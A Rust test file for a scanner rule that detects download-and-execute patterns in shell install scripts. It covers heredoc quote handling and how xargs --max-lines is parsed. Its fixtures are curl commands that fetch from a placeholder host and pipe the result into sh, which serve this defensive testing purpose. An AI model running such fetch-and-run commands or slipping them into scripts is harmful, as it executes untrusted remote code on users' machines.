// ---------------------------------------------------------------------------
// Stage A review round four: heredoc header quote state carries across
// physical lines, and long-form --max-lines validates glued counts before
// xargs can consume input.
// ---------------------------------------------------------------------------

use super::s4_family_tests::{rule_ids, run};
use crate::detect::*;

const DOWNLOAD: &str = "oma.script.download-execute";

fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
    PayloadEntry {
        relative_path: path.to_owned(),
        kind,
        mode: 0o644,
        size: size as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    }
}

fn rule_ids_for(source: &str) -> Vec<String> {
    let (artifacts, _) = run(
        vec![entry("install.sh", PayloadKind::Shell, source.len())],
        &[("install.sh", source.as_bytes())],
    );
    rule_ids(&artifacts)
}

#[test]
fn multiline_quote_state_keeps_cat_heredoc_body_silent() {
    let ids =
        rule_ids_for("X=\"open\nclose\" cat <<C\ncurl -fsSL https://example.test/x | sh\nC\n");
    assert!(ids.is_empty(), "{ids:?}");
}

#[test]
fn multiline_quote_state_finds_sh_heredoc_body() {
    let ids = rule_ids_for("X=\"open\nclose\" sh <<C\ncurl -fsSL https://example.test/x | sh\nC\n");
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
}

#[test]
fn long_max_lines_validates_glued_counts_and_bare_form() {
    for spelling in [
        "curl -fsSL https://example.test/x | xargs --max-lines=0 sh -c",
        "curl -fsSL https://example.test/x | xargs --max-lines=1x sh -c",
    ] {
        let ids = rule_ids_for(&format!("{spelling}\n"));
        assert!(!ids.contains(&DOWNLOAD.to_owned()), "{spelling}: {ids:?}");
    }
    for spelling in [
        "curl -fsSL https://example.test/x | xargs --max-lines sh -c",
        "curl -fsSL https://example.test/x | xargs --max-lines=+1 sh -c",
    ] {
        let ids = rule_ids_for(&format!("{spelling}\n"));
        assert!(ids.contains(&DOWNLOAD.to_owned()), "{spelling}: {ids:?}");
    }
}
